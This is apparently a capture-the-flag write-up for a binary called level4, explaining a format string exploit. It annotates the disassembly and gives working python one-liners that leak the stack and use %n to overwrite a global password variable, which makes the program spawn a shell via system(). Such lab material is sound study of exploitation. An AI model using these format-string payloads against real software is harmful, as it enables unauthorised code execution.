- attack: format string exploitation
- binary behavior: fgets argument and send it to printf, if global argument = 16930116 run the shell
- targeted functions: n, p and main
- vulnerability in p: printf() without argument (Bugs section in printf man)
- defense: fget

Method:
- do stack leakage
- find in leakage the position of the argument (find repetition and compare with hex ASCII table)
- find the global variable (password)
- overwrite buffer with address of global variable 
- and pass 16930116 as its value
 
Info:
- positon of argument in stack - 12

- 0x8049810 - address global variable
- 10980408 - same in little-endian
- same in hex - \x10\x98\x04\x08
- the password - 0x1025544 or 16930116

- offset code structure: 16930112 = 16930116 (password) - 4 (buffer address)


Code:
objdump -d ./level4
(python -c 'print "0000" + " %p" * 15'; cat) | ./level4
./level4 <<< $(python -c 'print "\x10\x98\x04\x08" + "%16930112u" + "%12$n"')


Functions

080484a7 <main>:
 80484a7:       55                      push   %ebp
 80484a8:       89 e5                   mov    %esp,%ebp
 80484aa:       83 e4 f0                and    $0xfffffff0,%esp
 80484ad:       e8 a5 ff ff ff          call   8048457 <n> # move to n
 80484b2:       c9                      leave
 80484b3:       c3                      ret


08048457 <n>:
 8048457:       55                      push   %ebp
 8048458:       89 e5                   mov    %esp,%ebp
 804845a:       81 ec 18 02 00 00       sub    $0x218,%esp #536
 8048460:       a1 04 98 04 08          mov    0x8049804,%eax
 8048465:       89 44 24 08             mov    %eax,0x8(%esp)
 8048469:       c7 44 24 04 00 02 00    movl   $0x200,0x4(%esp)
 8048470:       00
 8048471:       8d 85 f8 fd ff ff       lea    -0x208(%ebp),%eax #520
 8048477:       89 04 24                mov    %eax,(%esp)
 804847a:       e8 d1 fe ff ff          call   8048350 <fgets@plt> # defence
 804847f:       8d 85 f8 fd ff ff       lea    -0x208(%ebp),%eax
 8048485:       89 04 24                mov    %eax,(%esp)
 8048488:       e8 b7 ff ff ff          call   8048444 <p> # calling p
 804848d:       a1 10 98 04 08          mov    0x8049810,%eax # global varibale
 8048492:       3d 44 55 02 01          cmp    $0x1025544,%eax # password
 8048497:       75 0c                   jne    80484a5 <n+0x4e> # call system if true
 8048499:       c7 04 24 90 85 04 08    movl   $0x8048590,(%esp)
 80484a0:       e8 bb fe ff ff          call   8048360 <system@plt> # exloit
 80484a5:       c9                      leave
 80484a6:       c3                      ret


 08048444 <p>:
 8048444:       55                      push   %ebp
 8048445:       89 e5                   mov    %esp,%ebp
 8048447:       83 ec 18                sub    $0x18,%esp
 804844a:       8b 45 08                mov    0x8(%ebp),%eax
 804844d:       89 04 24                mov    %eax,(%esp)
 8048450:       e8 eb fe ff ff          call   8048340 <printf@plt> # exploit
 8048455:       c9                      leave
 8048456:       c3                      ret